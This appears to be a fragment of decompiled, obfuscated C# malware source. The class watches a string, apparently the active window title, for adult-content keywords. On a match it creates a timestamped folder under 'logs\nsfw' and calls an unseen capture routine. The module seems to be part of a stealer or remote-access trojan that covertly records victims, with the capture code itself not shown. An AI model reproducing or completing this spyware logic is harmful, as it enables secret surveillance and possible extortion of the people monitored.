using System;
using System.IO;
using System.Threading;
using ns13;
using ns14;
using ns2;
using ns5;

namespace ns15;

internal sealed class Class72
{
	private static string string_0 = Path.Combine(Class56.smethod_0(), "logs\\nsfw\\" + DateTime.Now.ToString("yyyy-MM-dd"));

	public static void smethod_0()
	{
		if (smethod_1())
		{
			smethod_2();
		}
	}

	private static bool smethod_1()
	{
		string[] string_ = Class9.string_3;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string value = string_[num];
				if (Class69.string_0.ToLower().Contains(value))
				{
					break;
				}
				num++;
				continue;
			}
			return false;
		}
		return true;
	}

	private static void smethod_2()
	{
		string path = string_0 + "\\" + DateTime.Now.ToString("hh.mm.ss");
		if (!Directory.Exists(path))
		{
			Directory.CreateDirectory(path);
		}
		Thread.Sleep(3000);
		Class18.smethod_0(path);
		Thread.Sleep(12000);
	}
}
